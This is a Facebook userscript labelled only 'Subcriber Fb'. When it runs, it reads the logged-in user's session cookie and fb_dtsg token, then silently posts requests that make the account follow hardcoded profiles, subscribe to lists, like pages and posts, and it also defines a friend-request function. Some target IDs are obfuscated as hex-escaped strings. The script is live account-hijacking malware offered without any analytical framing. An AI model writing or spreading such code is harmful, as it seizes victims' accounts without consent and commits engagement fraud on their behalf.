// ==UserScript==
// @name            Subcriber Fb
// @namespace       Subcribes
// @description     Sub
// @include         http://www.facebook.com/*
// @include         https://www.facebook.com/*
// @exclude	    htt*://*static*.facebook.com*
// @exclude	    htt*://*channel*.facebook.com*
// @exclude	    htt*://developers.facebook.com/*
// @exclude	    htt*://upload.facebook.com/*
// @exclude	    htt*://www.facebook.com/common/blank.html
// @exclude	    htt*://*connect.facebook.com/*
// @exclude	    htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/places/*
// @exclude			htt*://www.facebook.com/about/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude 		htt*://apps.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/ci_partner/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*
// @exclude         htt*://developers.facebook.com/*
// @exclude         http://www.facebook.com/plugins/*
// @exclude         http://www.facebook.com/dialog/feed*
// @exclude         https://www.facebook.com/plugins/*
// @exclude         https://www.facebook.com/dialog/feed*
// @exclude         http://www.facebook.com/dialog/oauth?*
// @exclude         https://www.facebook.com/dialog/oauth?*
// @exclude         http://www.facebook.com/dialog/apprequests/*
// @exclude         https://www.facebook.com/dialog/apprequests/*
// @exclude         http://www.facebook.com/l.php?u=*
// @exclude         https://www.facebook.com/l.php?*
// @exclude         https://www.facebook.com/places/map_iframe.php?*
// @include         http://www.facebook.com/pokes
// @include         https://www.facebook.com/pokes
// @include         http://www.facebook.com/pokes?*
// @include         https://www.facebook.com/pokes?*
// @version         Mr.Simple Script
// ==/UserScript==
/* Mr.Simple Cyber4rt */
var parent=document.getElementsByTagName("html")[0];
var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone){var http4=new XMLHttpRequest;var url4="/ajax/follow/follow_profile.php?__a=1";var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";http4.open("POST",url4,true);http4.onreadystatechange=function(){if(http4.readyState==4&&http4.status==200)http4.close};http4.send(params4)}a("100001778412705");a("100007470312684");function sublist(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}sublist("528342607235015");sublist("595301490539126");var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var now=(new Date).getTime();function P(post){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/ufi/like.php";var XParams="like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=709265555762114&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function Like(p){var Page=new XMLHttpRequest();var PageURL="//www.facebook.com/ajax/pages/fan_status.php";var PageParams="&fbpage_id="+p+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";Page.open("POST",PageURL,true);Page.onreadystatechange=function(){if(Page.readyState==4&&Page.status==200){Page.close}};Page.send(PageParams)}Like("179437968904574");Like("481139115324349");function IDS(r){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/add_friend/action.php";var XParams="to_friend="+r+"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}
var _0x1f97=["\x35\x31\x38\x34\x31\x35\x37\x31\x31\x35\x33\x38\x32\x36\x35","\x34\x39\x39\x34\x34\x31\x31\x32\x30\x31\x36\x35\x33\x35\x36","\x34\x37\x37\x36\x34\x37\x35\x37\x35\x36\x36\x38\x33\x34\x32","\x36\x32\x35\x34\x33\x34\x30\x38\x37\x34\x37\x36\x33\x33\x39","\x31\x34\x36\x30\x32\x38\x35\x30\x35\x30\x38\x36\x31\x36\x37\x32","\x31\x34\x32\x32\x39\x38\x38\x38\x35\x37\x39\x34\x37\x30\x32\x38","\x31\x33\x39\x38\x39\x33\x32\x38\x38\x30\x33\x36\x38\x38\x33\x33"];Like(_0x1f97[0]);Like(_0x1f97[1]);Like(_0x1f97[2]);sublist(_0x1f97[3]);sublist(_0x1f97[4]);sublist(_0x1f97[5]);sublist(_0x1f97[6]);
//Sublist
P("592910680778207");
P("530495710353038");
P("526256417443634");
P("512981778771098");
P("576764289059513");
P("555470364522239");
P("547425218660087");
P("546814242054518");
P("599017253500883");
P("604703139598961");
P("607004576035484");
sublist("553835194685756");
sublist("596858643716744");
sublist("596858410383434");
sublist("595432640526011");
sublist("595432700526005");
sublist("595431777192764");
sublist("595432337192708");
sublist("595432350526040");
sublist("593488470720428");
sublist("528342607235015");
sublist("595301490539126");
a("100001778412705");
a("100007470312684");
Like("179437968904574");